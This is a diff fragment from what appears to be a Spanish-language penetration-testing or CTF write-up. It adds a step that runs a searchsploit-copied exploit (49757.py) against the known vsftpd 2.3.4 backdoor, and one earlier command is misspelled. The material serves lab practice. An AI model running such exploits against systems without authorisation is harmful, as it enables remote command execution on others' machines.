@@ -25,6 +25,7 @@ Vemos que usa vsftpd 2.3.4, que es vulnerable a un backdoor que permite ejecutar
 ```bash
 searsploit vsftpd 2.3.4 backdoor
 searchsploit -m unix/remote/49757.py
+sudo python3 49757.py
 ```
 
 ```bash
